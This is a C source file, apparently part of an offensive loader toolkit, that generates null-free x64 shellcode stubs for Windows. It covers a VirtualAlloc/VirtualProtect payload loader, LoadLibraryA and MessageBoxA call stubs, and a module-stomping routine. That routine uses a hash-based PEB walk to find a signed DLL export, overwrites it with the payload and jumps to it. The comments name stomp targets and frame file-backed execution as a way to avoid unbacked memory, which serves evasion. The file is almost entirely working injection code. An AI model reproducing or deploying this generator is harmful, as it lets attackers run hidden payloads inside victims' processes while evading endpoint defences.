/* ════════════════════════════════════════════════════════════════════
 * shellwriter.c
 * C port of original p3-loader's ShellCodeWriter.cpp
 *
 * Generates a null-free shellcode stub from an arbitrary payload.
 * Crystal Palace PIC-safe: no CRT, no globals, no switch, no stdlib.
 *
 * ════════════════════════════════════════════════════════════════════ */
#include "shellwriter.h"
#include "peb_walk_blob.h"

/* ── Windows memory protection constants ────────────────────────────
 * Defined locally — no windows.h in PIC context.                    */
#define SCW_PAGE_READWRITE 0x04
#define SCW_PAGE_EXECUTE_READ 0x20
#define SCW_MEM_COMMIT 0x1000
#define SCW_MEM_RESERVE 0x2000

/* ── Lifecycle ─────────────────────────────────────────────────────── */

void scw_init(SCW *w, u8 *buf, int cap)
{
    w->buf = buf;
    w->len = 0;
    w->cap = cap;
    w->stack_bytes = 0;
}

/* ── Raw emission ──────────────────────────────────────────────────── */

void scw_append(SCW *w, const u8 *b, int n)
{
    int i;
    for (i = 0; i < n; i++)
        if (w->len < w->cap)
            w->buf[w->len++] = b[i];
}

int scw_check_nulls(const SCW *w)
{
    int i;
    for (i = 0; i < w->len; i++)
        if (w->buf[i] == 0)
            return i;
    return -1;
}

/* ── SetRAX ──────────────────────────────────────────────────────────
 * Emits null-free code that sets RAX to any 64-bit value.
 *
 * value == 0:  xor rax, rax              (3 bytes)
 * else:        mov rax, XA               (10 bytes)
 *              mov r15, XB               (10 bytes)
 *              xor rax, r15              (3 bytes)
 *              = 23 bytes total, guaranteed null-free.
 *
 * XB = 0x0101010101010101 (adjusted per byte to avoid nulls in XA).
 * ─────────────────────────────────────────────────────────────────── */
void scw_set_rax(SCW *w, u64 value)
{
    u8 b[10];
    int i;

    if (value == 0)
    {
        /* xor rax, rax  →  48 31 C0 */
        b[0] = 0x48;
        b[1] = 0x31;
        b[2] = 0xC0;
        scw_append(w, b, 3);
        return;
    }

    {
        u64 xb = 0x0101010101010101ULL;
        for (i = 0; i < 8; i++)
            if (((u8 *)&value)[i] == 0x01)
                ((u8 *)&xb)[i] = 0x02;
        u64 xa = value ^ xb;

        /* mov rax, xa  →  48 B8 [xa LE] */
        b[0] = 0x48;
        b[1] = 0xB8;
        b[2] = (u8)xa;
        b[3] = (u8)(xa >> 8);
        b[4] = (u8)(xa >> 16);
        b[5] = (u8)(xa >> 24);
        b[6] = (u8)(xa >> 32);
        b[7] = (u8)(xa >> 40);
        b[8] = (u8)(xa >> 48);
        b[9] = (u8)(xa >> 56);
        scw_append(w, b, 10);

        /* mov r15, xb  →  49 BF [xb LE] */
        b[0] = 0x49;
        b[1] = 0xBF;
        b[2] = (u8)xb;
        b[3] = (u8)(xb >> 8);
        b[4] = (u8)(xb >> 16);
        b[5] = (u8)(xb >> 24);
        b[6] = (u8)(xb >> 32);
        b[7] = (u8)(xb >> 40);
        b[8] = (u8)(xb >> 48);
        b[9] = (u8)(xb >> 56);
        scw_append(w, b, 10);
    }

    /* xor rax, r15  →  4C 31 F8 */
    b[0] = 0x4C;
    b[1] = 0x31;
    b[2] = 0xF8;
    scw_append(w, b, 3);
}

/* ── PushValue ──────────────────────────────────────────────────────
 * Emits: set_rax(value) + push rax.  stack_bytes += 8.             */
void scw_push_value(SCW *w, u64 value)
{
    /* push rax  →  50 */
    u8 push_rax = 0x50;
    scw_set_rax(w, value);
    scw_append(w, &push_rax, 1);
    w->stack_bytes += 8;
}

/* ── PushBuffer ─────────────────────────────────────────────────────
 * Push `len` bytes so that RSP → data[0] after all pushes.
 * Pads to multiple of 8. Iterates in reverse so first byte is lowest.
 * Null bytes in data are encoded null-free via set_rax XOR trick.   */
void scw_push_buffer(SCW *w, const u8 *data, int len)
{
    int padded = (len + 7) & ~7;
    int i, j;
    for (i = padded - 8; i >= 0; i -= 8)
    {
        u64 val = 0;
        for (j = 0; j < 8; j++)
            if (i + j < len)
                ((u8 *)&val)[j] = data[i + j];
        scw_push_value(w, val);
    }
}

/* ── Internal: mov <arg_reg>, rax ───────────────────────────────────
 * Moves RAX into one of the four Win64 argument registers.
 *   reg 0 → RCX  (48 89 C1)
 *   reg 1 → RDX  (48 89 C2)
 *   reg 2 → R8   (49 89 C0)
 *   reg 3 → R9   (49 89 C1)
 * ─────────────────────────────────────────────────────────────────── */
static void _mov_arg_rax(SCW *w, int reg)
{
    u8 b[3];
    if (reg == 0)
    {
        b[0] = 0x48;
        b[1] = 0x89;
        b[2] = 0xC1;
    } /* mov rcx, rax */
    else if (reg == 1)
    {
        b[0] = 0x48;
        b[1] = 0x89;
        b[2] = 0xC2;
    } /* mov rdx, rax */
    else if (reg == 2)
    {
        b[0] = 0x49;
        b[1] = 0x89;
        b[2] = 0xC0;
    } /* mov r8,  rax */
    else
    {
        b[0] = 0x49;
        b[1] = 0x89;
        b[2] = 0xC1;
    } /* mov r9,  rax */
    scw_append(w, b, 3);
}

/* ── SetArgRegister ─────────────────────────────────────────────────
 * Sets Win64 argument register [0..3] to a constant value.         */
void scw_set_arg(SCW *w, int reg, u64 value)
{
    scw_set_rax(w, value);
    _mov_arg_rax(w, reg);
}

/* ── SetArgRegisterStackRelative ────────────────────────────────────
 * Sets Win64 argument register to RSP + offset.
 * Emits: set_rax(offset); add rax, rsp; mov <reg>, rax.
 * Must be called BEFORE scw_call so RSP depth is correct.          */
void scw_set_arg_sp(SCW *w, int reg, int offset)
{
    /* add rax, rsp  →  48 01 E0 */
    u8 add_rax_rsp[3] = {0x48, 0x01, 0xE0};
    scw_set_rax(w, (u64)offset);
    scw_append(w, add_rax_rsp, 3);
    _mov_arg_rax(w, reg);
}

/* ── Call ───────────────────────────────────────────────────────────
 * Emits a null-free aligned call to addr.
 *
 * Aligns RSP to 16 bytes before the call (Win64 ABI requirement).
 * If stack_bytes % 16 != 0: emits sub rsp,8 and increments counter.
 * The alignment is permanent — subsequent set_arg_sp offsets stay
 * correct without reverting.                                        */
void scw_call(SCW *w, u64 addr)
{
    u8 sub_rsp_8[4] = {0x48, 0x83, 0xEC, 0x08}; /* sub rsp, 8 */
    u8 add_rsp_8[4] = {0x48, 0x83, 0xC4, 0x08}; /* add rsp, 8 */

    if (w->stack_bytes % 16)
    {
        scw_append(w, sub_rsp_8, 4);
        w->stack_bytes += 8;
    }

    scw_set_rax(w, addr);
    {
        u8 call_rax[2] = {0xFF, 0xD0};
        scw_append(w, call_rax, 2);
    } /* call rax */

    /* Second alignment check — mirrors p3-loader exactly. */
    if (w->stack_bytes % 16)
    {
        scw_append(w, add_rsp_8, 4);
        w->stack_bytes -= 8;
    }
}

/* ════════════════════════════════════════════════════════════════════
 *  HIGH-LEVEL EMITTERS
 * ════════════════════════════════════════════════════════════════════ */

/* ── LoadAndCallShellCode ───────────────────────────────────────────
 * Generates a stub that at runtime in the target process:
 *   1. Pushes shellcode onto stack (null-free encoded)
 *   2. VirtualAlloc(NULL, sc_len, MEM_COMMIT, PAGE_READWRITE)
 *   3. Copies shellcode from stack to allocation
 *   4. VirtualProtect(alloc, sc_len, PAGE_EXECUTE_READ, scratch)
 *   5. jmp to allocation
 *
 * Note: VirtualAlloc creates anonymous unbacked memory — use
 * scw_stomp_and_call for file-backed execution instead.            */
void scw_load_and_call(SCW *w,
                       u64 virtual_alloc,
                       u64 virtual_protect,
                       const u8 *sc, int sc_len)
{
    /* 1. Push shellcode onto stack (null-free encoded) */
    scw_push_buffer(w, sc, sc_len);
    int pos_sc = w->stack_bytes;

    /* Allocate shadow space (shared by both calls below) */
    {
        u8 sub_rsp_32[4] = {0x48, 0x83, 0xEC, 0x20};
        scw_append(w, sub_rsp_32, 4);
    }
    w->stack_bytes += 32;

    /* 2. VirtualAlloc(NULL, sc_len, MEM_COMMIT, PAGE_READWRITE) */
    scw_set_arg(w, 0, 0);                  /* lpAddress   = NULL */
    scw_set_arg(w, 1, (u64)sc_len);        /* dwSize      = sc_len */
    scw_set_arg(w, 2, SCW_MEM_COMMIT);     /* flAllocType = MEM_COMMIT */
    scw_set_arg(w, 3, SCW_PAGE_READWRITE); /* flProtect   = PAGE_READWRITE */
    scw_call(w, virtual_alloc);
    /* rax = RW allocation base */

    /* 3. Save allocation base:
     *   mov r12, rax  →  49 89 C4  (destination base, used for final jmp)
     *   mov r10, rax  →  49 89 C2  (walking write pointer for copy loop) */
    {
        u8 b[3] = {0x49, 0x89, 0xC4};
        scw_append(w, b, 3);
    } /* mov r12, rax */
    {
        u8 b[3] = {0x49, 0x89, 0xC2};
        scw_append(w, b, 3);
    } /* mov r10, rax */

    /* r11 = sc_len (byte counter for copy loop)
     *   set_rax(sc_len) + mov r11, rax  →  49 89 C3 */
    scw_set_rax(w, (u64)sc_len);
    {
        u8 b[3] = {0x49, 0x89, 0xC3};
        scw_append(w, b, 3);
    } /* mov r11, rax */

    /* rcx = pointer to shellcode on stack */
    scw_set_arg_sp(w, 0, w->stack_bytes - pos_sc);

    /* Byte copy loop (16 bytes, all null-free):
     *   mov al,   [rcx]     8A 01
     *   mov [r10], al       41 88 02
     *   inc rcx             48 FF C1
     *   inc r10             49 FF C2
     *   dec r11             49 FF CB
     *   jnz -16             75 F0      ← loops back to mov al,[rcx] */
    {
        u8 copy_loop[16] = {
            0x8A, 0x01,       /* mov al, [rcx]  */
            0x41, 0x88, 0x02, /* mov [r10], al  */
            0x48, 0xFF, 0xC1, /* inc rcx        */
            0x49, 0xFF, 0xC2, /* inc r10        */
            0x49, 0xFF, 0xCB, /* dec r11        */
            0x75, 0xF0        /* jnz -16        */
        };
        scw_append(w, copy_loop, 16);
    }

    /* 4. VirtualProtect(r12, sc_len, PAGE_EXECUTE_READ, scratch)
     *   mov rcx, r12  →  4C 89 E1  */
    {
        u8 b[3] = {0x4C, 0x89, 0xE1};
        scw_append(w, b, 3);
    }                                              /* mov rcx, r12 */
    scw_set_arg(w, 1, (u64)sc_len);                /* dwSize */
    scw_set_arg(w, 2, SCW_PAGE_EXECUTE_READ);      /* flNewProtect */
    scw_set_arg_sp(w, 3, w->stack_bytes - pos_sc); /* lpflOldProtect (scratch) */
    scw_call(w, virtual_protect);

    /* Align RSP for jmp: if stack misaligned, use pop+push+push (null-free) */
    if (w->stack_bytes % 16)
    {
        u8 align[3] = {0x58, 0x50, 0x50}; /* pop rax; push rax; push rax */
        scw_append(w, align, 3);
        w->stack_bytes += 8;
    }

    /* 5. jmp r12  →  41 FF E4 */
    {
        u8 jmp_r12[3] = {0x41, 0xFF, 0xE4};
        scw_append(w, jmp_r12, 3);
    }
}

/* ── CallLoadLibraryA ───────────────────────────────────────────────
 * Generates a stub that calls LoadLibraryA(dll_name) at runtime.
 * The dll_name string is pushed onto the stack (null-free encoded). */
void scw_call_loadlib(SCW *w, u64 loadlibrary_a, const char *dll_name)
{
    int len = 0;
    while (dll_name[len])
        len++;
    len++; /* include null terminator */

    scw_push_buffer(w, (const u8 *)dll_name, len);
    int pos_buf = w->stack_bytes;

    /* Shadow space */
    {
        u8 sub_rsp_32[4] = {0x48, 0x83, 0xEC, 0x20};
        scw_append(w, sub_rsp_32, 4);
    }
    w->stack_bytes += 32;

    /* rcx = pointer to dll_name on stack */
    scw_set_arg_sp(w, 0, w->stack_bytes - pos_buf);

    scw_call(w, loadlibrary_a);
}

/* ── CallMessageBoxA ────────────────────────────────────────────────
 * Generates a stub that calls MessageBoxA(NULL, text, caption, type).
 * Both strings are pushed onto the stack (null-free encoded).       */
void scw_call_msgbox(SCW *w, u64 messagebox_a,
                     const char *text, const char *caption, u32 type)
{
    int tlen = 0, clen = 0;
    while (text[tlen])
        tlen++;
    tlen++;
    while (caption[clen])
        clen++;
    clen++;

    /* Push caption first (higher stack offset = larger rsp delta) */
    scw_push_buffer(w, (const u8 *)caption, clen);
    int pos_caption = w->stack_bytes;

    scw_push_buffer(w, (const u8 *)text, tlen);
    int pos_text = w->stack_bytes;

    /* Shadow space */
    {
        u8 sub_rsp_32[4] = {0x48, 0x83, 0xEC, 0x20};
        scw_append(w, sub_rsp_32, 4);
    }
    w->stack_bytes += 32;

    scw_set_arg(w, 0, 0);                               /* hWnd    = NULL */
    scw_set_arg_sp(w, 1, w->stack_bytes - pos_text);    /* lpText  */
    scw_set_arg_sp(w, 2, w->stack_bytes - pos_caption); /* lpCaption */
    scw_set_arg(w, 3, (u64)type);                       /* uType   */

    scw_call(w, messagebox_a);
}

/* ── CallTerminateProcess ───────────────────────────────────────────
 * Generates a stub that calls NtTerminateProcess(handle, exit_status).
 * NtCurrentProcess pseudo-handle = 0xFFFFFFFFFFFFFFFF.              */
void scw_call_terminate(SCW *w, u64 nt_terminate,
                        u64 handle, u32 exit_status)
{
    scw_set_arg(w, 0, handle);
    scw_set_arg(w, 1, (u64)exit_status);
    scw_call(w, nt_terminate);
}

/* ════════════════════════════════════════════════════════════════════
 * scw_stomp_and_call — module stomping stub generator
 *
 * Generates a stub that at runtime in the target process:
 *   1. Pushes shellcode onto stack (null-free encoded)
 *   2. PEB walks to find dll_name → r13 (DLL base)
 *   3. Export walks to find export_name → r12 (function address)
 *   4. VirtualProtect(r12, sc_len, PAGE_READWRITE,  &scratch)
 *   5. Copies shellcode from stack → r12
 *   6. VirtualProtect(r12, sc_len, PAGE_EXECUTE_READ, &scratch)
 *   7. jmp r12
 *
 * Shellcode executes from file-backed signed module memory.
 * No VirtualAlloc — no anonymous unbacked memory.
 *
 * The PEB walk blob is embedded from peb_walk_blob.h (generated
 * from src/peb_walk.asm). Hash offsets are patched at generation time.
 *
 * Hash algorithm: ROR13
 *   dll_name   → tolower applied  (module names are case-insensitive)
 *   export_name → no tolower      (export names are case-sensitive)
 *
 * Good stomp targets (small, rarely called in winver.exe):
 *   kernel32.dll!BaseCheckAppcompatCache
 *   clbcatq.dll!DllGetClassObject   (load first if not already mapped)
 * ════════════════════════════════════════════════════════════════════ */

/* ROR13 helpers */
static u32 _ror13h(u32 v) { return (v >> 13) | (v << 19); }

static u32 _mh_mod(const char *s) /* tolower — for module names */
{
    u32 r = 0;
    while (*s)
    {
        u8 c = (u8)*s++;
        if (c >= 'A' && c <= 'Z')
            c += 0x20;
        r = _ror13h(r) + c;
    }
    return r;
}

static u32 _mh_exp(const char *s) /* no tolower — for export names */
{
    u32 r = 0;
    while (*s)
        r = _ror13h(r) + (u8)*s++;
    return r;
}

void scw_stomp_and_call(SCW *w,
                        u64 virtual_protect,
                        const char *dll_name,
                        const char *export_name,
                        const u8 *sc, int sc_len)
{
    u32 dll_hash = _mh_mod(dll_name);
    u32 func_hash = _mh_exp(export_name);

    /* Copy blob and patch DLL + export hashes at known offsets */
    u8 blob[PEB_WALK_SIZE];
    int i;
    for (i = 0; i < PEB_WALK_SIZE; i++)
        blob[i] = _peb_walk_blob[i];
    blob[DLL_HASH_OFF + 0] = (u8)(dll_hash);
    blob[DLL_HASH_OFF + 1] = (u8)(dll_hash >> 8);
    blob[DLL_HASH_OFF + 2] = (u8)(dll_hash >> 16);
    blob[DLL_HASH_OFF + 3] = (u8)(dll_hash >> 24);
    blob[FUNC_HASH_OFF + 0] = (u8)(func_hash);
    blob[FUNC_HASH_OFF + 1] = (u8)(func_hash >> 8);
    blob[FUNC_HASH_OFF + 2] = (u8)(func_hash >> 16);
    blob[FUNC_HASH_OFF + 3] = (u8)(func_hash >> 24);

    /* 1. Push shellcode onto stack (null-free encoded) */
    scw_push_buffer(w, sc, sc_len);
    int pos_sc = w->stack_bytes;

    /* Shadow space */
    {
        u8 sub_rsp_32[4] = {0x48, 0x83, 0xEC, 0x20};
        scw_append(w, sub_rsp_32, 4);
    }
    w->stack_bytes += 32;

    /* 2+3. PEB walk + export walk → r12 = function addr, r13 = dll base */
    scw_append(w, blob, PEB_WALK_SIZE);

    /* 4. Push scratch qword for lpflOldProtect output parameter */
    scw_push_value(w, 0);
    int pos_oldprot = w->stack_bytes;

    /* VirtualProtect(r12, sc_len, PAGE_READWRITE, &oldprot) */
    {
        u8 mov_rcx_r12[3] = {0x4C, 0x89, 0xE1};
        scw_append(w, mov_rcx_r12, 3);
    }
    scw_set_arg(w, 1, (u64)sc_len);
    scw_set_arg(w, 2, SCW_PAGE_READWRITE);
    scw_set_arg_sp(w, 3, w->stack_bytes - pos_oldprot);
    scw_call(w, virtual_protect);

    /* 5. Copy shellcode from stack → r12
     *   rcx = src (shellcode on stack)
     *   r10 = dst (r12, function to overwrite)
     *   r11 = byte count                                              */
    scw_set_arg_sp(w, 0, w->stack_bytes - pos_sc); /* rcx = src */
    {
        u8 mov_rax_r12[3] = {0x4C, 0x89, 0xE0};
        scw_append(w, mov_rax_r12, 3);
    } /* mov rax, r12 */
    {
        u8 mov_r10_rax[3] = {0x49, 0x89, 0xC2};
        scw_append(w, mov_r10_rax, 3);
    } /* mov r10, rax */
    scw_set_rax(w, (u64)sc_len);
    {
        u8 mov_r11_rax[3] = {0x49, 0x89, 0xC3};
        scw_append(w, mov_r11_rax, 3);
    } /* mov r11, rax */

    {
        u8 copy_loop[16] = {
            0x8A, 0x01,       /* mov al, [rcx]  */
            0x41, 0x88, 0x02, /* mov [r10], al  */
            0x48, 0xFF, 0xC1, /* inc rcx        */
            0x49, 0xFF, 0xC2, /* inc r10        */
            0x49, 0xFF, 0xCB, /* dec r11        */
            0x75, 0xF0        /* jnz -16        */
        };
        scw_append(w, copy_loop, 16);
    }

    /* 6. VirtualProtect(r12, sc_len, PAGE_EXECUTE_READ, &oldprot) */
    {
        u8 mov_rcx_r12[3] = {0x4C, 0x89, 0xE1};
        scw_append(w, mov_rcx_r12, 3);
    }
    scw_set_arg(w, 1, (u64)sc_len);
    scw_set_arg(w, 2, SCW_PAGE_EXECUTE_READ);
    scw_set_arg_sp(w, 3, w->stack_bytes - pos_oldprot);
    scw_call(w, virtual_protect);

    /* 7. Align RSP for jmp */
    if (w->stack_bytes % 16)
    {
        u8 align[3] = {0x58, 0x50, 0x50}; /* pop rax; push rax; push rax */
        scw_append(w, align, 3);
        w->stack_bytes += 8;
    }

    /* jmp r12  →  41 FF E4 */
    {
        u8 jmp_r12[3] = {0x41, 0xFF, 0xE4};
        scw_append(w, jmp_r12, 3);
    }
}